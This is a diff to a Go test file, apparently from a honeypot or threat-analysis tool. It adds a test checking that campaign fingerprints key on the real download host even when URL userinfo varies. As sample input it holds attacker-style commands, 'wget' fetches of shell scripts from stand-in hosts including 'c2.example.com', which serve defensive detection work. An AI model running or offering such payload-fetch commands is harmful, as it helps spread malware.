@@ -49,6 +49,17 @@ func TestSessionMergesForSameCampaign(t *testing.T) {
 	}
 }
 
+// The download host in a campaign fingerprint is the host the URL connects
+// to; userinfo in front of it is free text an attacker can vary per bot.
+func TestFingerprintUsesHostAfterUserinfo(t *testing.T) {
+	a := campaignFingerprint(makeTTPEvent("203.0.113.1", "wget http://a.example@203.0.113.9/x.sh"))
+	b := campaignFingerprint(makeTTPEvent("203.0.113.2", "wget http://b.example@203.0.113.9/x.sh"))
+	c := campaignFingerprint(makeTTPEvent("203.0.113.3", "wget http://203.0.113.9/x.sh"))
+	if a != b || b != c {
+		t.Fatalf("same download host, different fingerprints: %s %s %s", a, b, c)
+	}
+}
+
 func TestSessionEventCountGrows(t *testing.T) {
 	b := NewTTPBuilder(30 * time.Minute)
 	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")
